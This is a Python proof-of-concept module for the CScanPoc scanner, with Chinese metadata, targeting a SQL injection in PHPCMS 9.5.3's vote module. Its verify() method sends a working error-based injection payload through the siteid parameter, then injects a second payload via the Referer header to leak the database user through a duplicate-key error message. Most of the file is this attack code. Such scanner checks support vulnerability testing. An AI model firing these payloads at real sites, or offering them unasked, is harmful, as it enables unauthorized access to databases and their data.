# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0016'  # 平台漏洞编号，留空
    name = 'PHPCMS 9.5.3 vote_tag.class.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-18'  # 漏洞公布时间
    desc = '''
        PHPCMS 9.5.3 /phpcms/modules/vote/classes/vote_tag.class.php 文件siteid变量可控
        需register_globals=on
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=051077'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = '9.5.3'  # 漏洞应用版本


class Poc(ABPoc):
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间
    poc_id = ""

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php?m=vote&c=index&siteid=1%27%20and%20(select%201%20from%20%20(select%20count(*),concat(md5(123),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%20%23"
            payload1 = {}
            url = arg + payload
            code, _head, res, _errcode, _ = hh.http(url)
            if code == 200 and '202cb962ac59075b964b07152d234b701' in res:
                payload1 = {
                    "Referer": ",(SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a),'1')#"
                }
            url = '{target}'.format(
                target=self.target)+'/index.php?m=poster&c=index&a=poster_click&id=1'
            res = requests.post(url, headers=payload1)
            if res.status_code == 200 and "for key 'group_key'" in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
